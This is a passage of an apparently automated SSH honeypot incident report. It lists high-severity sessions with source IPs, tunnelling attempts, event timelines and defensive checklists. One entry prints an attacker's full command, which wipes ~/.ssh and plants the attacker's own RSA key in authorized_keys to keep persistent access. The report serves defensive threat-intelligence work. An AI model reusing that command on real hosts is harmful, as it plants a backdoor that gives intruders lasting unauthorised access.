| `2026-09-04 08:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3d9e96a616

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 08:42 |
| **Last Seen** | 2026-09-04 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:42:34` | `cowrie.session.connect` |
| `2026-09-04 08:42:34` | `cowrie.client.version` |
| `2026-09-04 08:42:34` | `cowrie.client.kex` |
| `2026-09-04 08:42:35` | `cowrie.login.success` |
| `2026-09-04 08:42:35` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:42:35` | `cowrie.direct-tcpip.data` |
| `2026-09-04 08:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdc6bf4c9077

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 08:42 |
| **Last Seen** | 2026-09-04 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:42:46` | `cowrie.session.connect` |
| `2026-09-04 08:42:46` | `cowrie.client.version` |
| `2026-09-04 08:42:46` | `cowrie.client.kex` |
| `2026-09-04 08:42:47` | `cowrie.login.success` |
| `2026-09-04 08:42:47` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:42:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 08:42:48` | `cowrie.direct-tcpip.data` |
| `2026-09-04 08:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84b6e36cee95

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 08:53 |
| **Last Seen** | 2026-09-04 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:53:42` | `cowrie.session.connect` |
| `2026-09-04 08:53:42` | `cowrie.client.version` |
| `2026-09-04 08:53:42` | `cowrie.client.kex` |
| `2026-09-04 08:53:43` | `cowrie.login.success` |
| `2026-09-04 08:53:43` | `cowrie.direct-tcpip.request` |
| `2026-09-04 08:53:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 08:53:44` | `cowrie.direct-tcpip.data` |
| `2026-09-04 08:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b809e613205

| Field | Detail |
|---|---|
| **Source IP** | `80.89.199[.]242` |
| **First Seen** | 2026-09-04 08:58 |
| **Last Seen** | 2026-09-04 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 08:58:16` | `cowrie.session.connect` |
| `2026-09-04 08:58:16` | `cowrie.client.version` |
| `2026-09-04 08:58:16` | `cowrie.client.kex` |
| `2026-09-04 08:58:17` | `cowrie.login.success` |
| `2026-09-04 08:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.89.199[.]242` to AbuseIPDB if not already reported
- [ ] Block `80.89.199[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13d86b6efb7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 09:04 |
| **Last Seen** | 2026-09-04 09:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:04:45` | `cowrie.session.connect` |
| `2026-09-04 09:04:45` | `cowrie.client.version` |
| `2026-09-04 09:04:45` | `cowrie.client.kex` |
| `2026-09-04 09:04:46` | `cowrie.login.success` |
| `2026-09-04 09:04:46` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:04:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 09:04:46` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe9c75463f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 09:15 |
| **Last Seen** | 2026-09-04 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:15:51` | `cowrie.session.connect` |
| `2026-09-04 09:15:51` | `cowrie.client.version` |
| `2026-09-04 09:15:51` | `cowrie.client.kex` |
| `2026-09-04 09:15:52` | `cowrie.login.success` |
| `2026-09-04 09:15:52` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:15:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 09:15:52` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40868ca5a253

| Field | Detail |
|---|---|
| **Source IP** | `118.196.96[.]129` |
| **First Seen** | 2026-09-04 09:22 |
| **Last Seen** | 2026-09-04 09:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:22:04` | `cowrie.session.connect` |
| `2026-09-04 09:22:04` | `cowrie.client.version` |
| `2026-09-04 09:22:04` | `cowrie.client.kex` |
| `2026-09-04 09:22:05` | `cowrie.login.success` |
| `2026-09-04 09:22:06` | `cowrie.session.params` |
| `2026-09-04 09:22:06` | `cowrie.command.input` |
| `2026-09-04 09:22:06` | `cowrie.log.closed` |
| `2026-09-04 09:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.96[.]129` to AbuseIPDB if not already reported
- [ ] Block `118.196.96[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ba44e34982

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 09:26 |
| **Last Seen** | 2026-09-04 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:26:48` | `cowrie.session.connect` |
| `2026-09-04 09:26:48` | `cowrie.client.version` |
| `2026-09-04 09:26:48` | `cowrie.client.kex` |
| `2026-09-04 09:26:49` | `cowrie.login.success` |
| `2026-09-04 09:26:49` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:26:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 09:26:49` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffbebd190b63

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 09:37 |
| **Last Seen** | 2026-09-04 09:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:37:49` | `cowrie.session.connect` |
| `2026-09-04 09:37:49` | `cowrie.client.version` |
| `2026-09-04 09:37:50` | `cowrie.client.kex` |
| `2026-09-04 09:37:51` | `cowrie.login.success` |
| `2026-09-04 09:37:51` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:37:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 09:37:51` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b4fbb8a20b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 09:48 |
| **Last Seen** | 2026-09-04 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:48:54` | `cowrie.session.connect` |
| `2026-09-04 09:48:54` | `cowrie.client.version` |
| `2026-09-04 09:48:55` | `cowrie.client.kex` |
| `2026-09-04 09:48:55` | `cowrie.login.success` |
| `2026-09-04 09:48:56` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:48:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 09:48:56` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba8d770ddf5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 09:58 |
| **Last Seen** | 2026-09-04 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 09:58:07` | `cowrie.session.connect` |
| `2026-09-04 09:58:07` | `cowrie.client.version` |
| `2026-09-04 09:58:07` | `cowrie.client.kex` |
| `2026-09-04 09:58:08` | `cowrie.login.success` |
| `2026-09-04 09:58:08` | `cowrie.direct-tcpip.request` |
| `2026-09-04 09:58:08` | `cowrie.direct-tcpip.data` |
| `2026-09-04 09:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5a6268edd80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:00 |
| **Last Seen** | 2026-09-04 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:00:00` | `cowrie.session.connect` |
| `2026-09-04 10:00:00` | `cowrie.client.version` |
| `2026-09-04 10:00:00` | `cowrie.client.kex` |
| `2026-09-04 10:00:01` | `cowrie.login.success` |
| `2026-09-04 10:00:01` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:00:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:00:01` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae0843f1d96

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-04 10:06 |
| **Last Seen** | 2026-09-04 10:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:06:57` | `cowrie.session.connect` |
| `2026-09-04 10:06:57` | `cowrie.client.version` |
| `2026-09-04 10:06:57` | `cowrie.client.kex` |
| `2026-09-04 10:06:58` | `cowrie.login.success` |
| `2026-09-04 10:06:59` | `cowrie.session.params` |
| `2026-09-04 10:06:59` | `cowrie.command.input` |
| `2026-09-04 10:06:59` | `cowrie.command.failed` |
| `2026-09-04 10:07:00` | `cowrie.log.closed` |
| `2026-09-04 10:07:01` | `cowrie.session.params` |
| `2026-09-04 10:07:01` | `cowrie.command.input` |
| `2026-09-04 10:07:01` | `cowrie.session.file_download` |
| `2026-09-04 10:07:01` | `cowrie.log.closed` |
| `2026-09-04 10:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6248054744c6

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-04 10:07 |
| **Last Seen** | 2026-09-04 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:07:02` | `cowrie.session.connect` |
| `2026-09-04 10:07:02` | `cowrie.client.version` |
| `2026-09-04 10:07:02` | `cowrie.client.kex` |
| `2026-09-04 10:07:03` | `cowrie.login.success` |
| `2026-09-04 10:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e978417a851a

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-04 10:07 |
| **Last Seen** | 2026-09-04 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:07:04` | `cowrie.session.connect` |
| `2026-09-04 10:07:04` | `cowrie.client.version` |
| `2026-09-04 10:07:04` | `cowrie.client.kex` |
| `2026-09-04 10:07:05` | `cowrie.login.success` |
| `2026-09-04 10:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb564e39fb1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:11 |
| **Last Seen** | 2026-09-04 10:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:11:01` | `cowrie.session.connect` |
| `2026-09-04 10:11:01` | `cowrie.client.version` |
| `2026-09-04 10:11:02` | `cowrie.client.kex` |
| `2026-09-04 10:11:02` | `cowrie.login.success` |
| `2026-09-04 10:11:03` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:11:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:11:03` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c27d7c9575c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:22 |
| **Last Seen** | 2026-09-04 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:22:02` | `cowrie.session.connect` |
| `2026-09-04 10:22:02` | `cowrie.client.version` |
| `2026-09-04 10:22:02` | `cowrie.client.kex` |
| `2026-09-04 10:22:03` | `cowrie.login.success` |
| `2026-09-04 10:22:03` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:22:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:22:03` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014f5faefd53

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 10:24 |
| **Last Seen** | 2026-09-04 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:24:44` | `cowrie.session.connect` |
| `2026-09-04 10:24:44` | `cowrie.client.version` |
| `2026-09-04 10:24:44` | `cowrie.client.kex` |
| `2026-09-04 10:24:45` | `cowrie.login.success` |
| `2026-09-04 10:24:45` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:24:45` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e2c72a0218

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:33 |
| **Last Seen** | 2026-09-04 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:33:07` | `cowrie.session.connect` |
| `2026-09-04 10:33:07` | `cowrie.client.version` |
| `2026-09-04 10:33:07` | `cowrie.client.kex` |
| `2026-09-04 10:33:08` | `cowrie.login.success` |
| `2026-09-04 10:33:08` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:33:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:33:08` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b652dd90f8a0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:44 |
| **Last Seen** | 2026-09-04 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:44:08` | `cowrie.session.connect` |
| `2026-09-04 10:44:08` | `cowrie.client.version` |
| `2026-09-04 10:44:08` | `cowrie.client.kex` |
| `2026-09-04 10:44:09` | `cowrie.login.success` |
| `2026-09-04 10:44:09` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:44:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:44:09` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3cfba0e6f3

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]38` |
| **First Seen** | 2026-09-04 10:53 |
| **Last Seen** | 2026-09-04 10:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:53:33` | `cowrie.session.connect` |
| `2026-09-04 10:53:33` | `cowrie.login.success` |
| `2026-09-04 10:53:33` | `cowrie.session.params` |
| `2026-09-04 10:53:33` | `cowrie.command.input` |
| `2026-09-04 10:53:33` | `cowrie.command.input` |
| `2026-09-04 10:53:33` | `cowrie.command.failed` |
| `2026-09-04 10:53:33` | `cowrie.command.input` |
| `2026-09-04 10:53:33` | `cowrie.command.failed` |
| `2026-09-04 10:53:33` | `cowrie.command.input` |
| `2026-09-04 10:53:33` | `cowrie.log.closed` |
| `2026-09-04 10:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]38` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e9c8535779

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 10:55 |
| **Last Seen** | 2026-09-04 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 10:55:09` | `cowrie.session.connect` |
| `2026-09-04 10:55:09` | `cowrie.client.version` |
| `2026-09-04 10:55:09` | `cowrie.client.kex` |
| `2026-09-04 10:55:10` | `cowrie.login.success` |
| `2026-09-04 10:55:10` | `cowrie.direct-tcpip.request` |
| `2026-09-04 10:55:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 10:55:10` | `cowrie.direct-tcpip.data` |
| `2026-09-04 10:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f96efeb242b4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 11:06 |
| **Last Seen** | 2026-09-04 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:06:11` | `cowrie.session.connect` |
| `2026-09-04 11:06:11` | `cowrie.client.version` |
| `2026-09-04 11:06:11` | `cowrie.client.kex` |
| `2026-09-04 11:06:12` | `cowrie.login.success` |
